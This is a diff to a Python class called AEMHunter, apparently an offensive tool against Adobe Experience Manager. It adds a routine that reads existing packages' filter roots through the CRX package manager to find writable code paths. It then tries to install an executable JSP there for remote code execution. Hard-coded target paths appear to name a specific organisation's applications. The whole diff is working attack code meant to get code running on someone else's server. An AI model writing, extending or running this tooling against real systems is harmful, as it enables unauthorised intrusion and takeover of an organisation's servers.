@@ -1230,9 +1230,12 @@ class AEMHunter:
             headers["CSRF-Token"] = self._csrf_token
 
         # The role may be barred from /apps ROOT yet allowed to install into its
-        # OWN app (e.g. a CPB Content Package Deployer can write /apps/cpb). So
-        # try installing the JSP into each discoverable /apps subpath, not just one.
-        code_roots = ["/apps"]
+        # OWN app (e.g. a CPB Content Package Deployer can write /apps/cpb). Best
+        # targets = the code roots that EXISTING packages already deploy to (read
+        # from their filters via our repo-read) — those are paths this role is
+        # actually allowed to install into. Then fall back to /apps children + guesses.
+        code_roots = self._discover_pkg_filter_roots()      # real, allowed deploy targets first
+        code_roots += ["/apps"]
         code_roots += self._discover_apps_children()
         code_roots += ["/apps/cpb", "/apps/citi-base", "/apps/citi-cgcpc", "/apps/cgcpc",
                        "/apps/citi-foundation", "/apps/settings", "/libs"]
@@ -1243,7 +1246,7 @@ class AEMHunter:
             if r and r not in seen_roots:
                 seen_roots.add(r)
                 roots.append(r)
-        roots = roots[:12]
+        roots = roots[:18]
 
         self.logger.info(f"upload+install RCE: trying {len(roots)} code path(s) for an "
                          "installable+executable JSP...")
@@ -1436,7 +1439,44 @@ class AEMHunter:
                         out.append("/apps/" + k)
             except Exception:
                 pass
-        return out[:8]
+        return out[:20]
+
+    def _discover_pkg_filter_roots(self) -> List[str]:
+        """Read EXISTING packages' filter roots from the repo. Those are paths the
+        deploy role is actually allowed to install into — far better install
+        targets than blind /apps guesses. Returns code roots under /apps or /libs."""
+        roots: List[str] = []
+        seen: Set[str] = set()
+        ls = self.client.get("/crx/packmgr/service.jsp?cmd=ls")
+        if not (ls and ls.status_code == 200 and not self._is_authwall(ls)):
+            return roots
+        body = ls.text or ""
+        pkgs = re.findall(r"<package>.*?</package>", body, re.S)[:15]
+        for pk in pkgs:
+            g = re.search(r"<group>([^<]*)</group>", pk)
+            dn = re.search(r"<downloadName>([^<]*)</downloadName>", pk)
+            nm = re.search(r"<name>([^<]*)</name>", pk)
+            if not (dn or nm):
+                continue
+            grp = (g.group(1) if g else "").strip("/")
+            fname = dn.group(1) if dn else (nm.group(1) + ".zip")
+            defbase = f"/etc/packages/{grp}/{fname}/jcr:content/vlt:definition/filter".replace("//", "/")
+            fr = self.client.get(defbase + ".infinity.json") or self.client.get(defbase + ".3.json")
+            if not (fr and fr.status_code == 200 and not self._is_authwall(fr)):
+                continue
+            for m in re.finditer(r'"root"\s*:\s*"(/(?:apps|libs)/[^"]+)"', fr.text or ""):
+                rt = m.group(1)
+                segs = rt.strip("/").split("/")
+                cand = "/" + "/".join(segs[:3]) if len(segs) >= 3 else rt  # app-level root
+                if cand not in seen:
+                    seen.add(cand)
+                    roots.append(cand)
+            if len(roots) >= 8:
+                break
+        if roots:
+            self.logger.info(f"Discovered {len(roots)} real package-filter code root(s) to "
+                             f"target for install: {', '.join(roots[:8])}")
+        return roots[:8]
 
     # ---- Sling POST: find a CODE-EXECUTABLE writable path, then prove RCE ----
     def _escalate_sling_write(self) -> bool:
